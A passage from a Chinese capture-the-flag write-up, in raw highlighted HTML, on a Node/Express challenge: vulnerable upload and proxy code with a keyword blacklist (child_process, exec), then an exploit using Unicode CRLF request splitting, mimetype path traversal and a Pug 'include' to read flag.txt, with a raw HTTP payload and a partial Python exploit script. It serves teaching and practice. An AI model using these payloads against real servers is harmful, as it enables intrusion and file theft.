&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;file type error&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir_file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload success&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 源码
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/source.txt&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// q参数
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/source?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#75715e">// 可控端点
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 黑名单过滤
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;error occurs!&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// urlencode绕过 字符串拼接绕过 unicode绕过
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>有上面两个题的铺垫，这个代码就会好理解一些&lt;/p>
&lt;p>这个题改编的地方在于多了一个任意文件上传，可以通过&lt;code>../&lt;/code>的mimetype来进行目录穿越，pug渲染会借助我们上传的.pug模板，在这里包含flag.txt&lt;/p>
&lt;p>通过抓包修改内容来做payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">HTTP/1.1
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Host: amiz
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/file_upload&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">amiz&lt;/span>
&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">266&lt;/span>
&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf&lt;/span>
&lt;span style="color:#111">Cache-control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
------WebKitFormBoundary4RZFWBFQ4MBn61cf
Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
Content-Type: /../template
doctype html
html
head
style
include ../../../../../../../flag.txt
------WebKitFormBoundary4RZFWBFQ4MBn61cf--
GET /flag HTTP/1.1
Host: amiz
Connection: close
amiz:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用上面我们已经构造好的通用exp.py构造payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span>
&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">DOUBLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0122&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SINGLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0127&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;span style="color:#d88200">Content-Type: /../template
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;span style="color:#d88200">html
&lt;/span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;span style="color:#d88200">amiz: &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SINGLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span 